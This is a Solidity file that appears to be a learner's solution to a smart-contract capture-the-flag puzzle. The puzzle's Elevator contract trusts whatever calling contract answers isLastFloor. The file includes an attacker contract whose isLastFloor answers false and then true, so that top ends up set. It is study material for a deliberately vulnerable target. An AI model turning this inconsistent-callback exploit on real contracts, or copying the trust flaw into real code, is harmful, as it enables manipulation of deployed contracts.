// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.*/


//This is pointing to a building contract
//Do we know what the contract looks like?
//Can we maybe create a contract called building?
contract ElevatorAttac{
// This contact must create a building instance which is passed to Elevator
    bool public lastFloor;
    bool public lastFloorUsed;
    Elevator elevatorTarget;
    uint256 randomFloor = 5;

    constructor (address _elevatorTarget){
        elevatorTarget = Elevator(_elevatorTarget);
        lastFloor = false;
        lastFloorUsed = false;
    }

    function attack() public {
        elevatorTarget.goTo(randomFloor); 
    }

        //If function has been used once then we change lastFloor to ture, else lastFloor isfalse
    function isLastFloor(uint256) public returns (bool){
        if (lastFloorUsed == true){
            lastFloor = true;
            return lastFloor;
        }else{
            lastFloorUsed = true;
            lastFloor = false;
            return lastFloor;
        }
    }
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;


    //So whoever calls the goto funcion can be the building master
    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);


        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
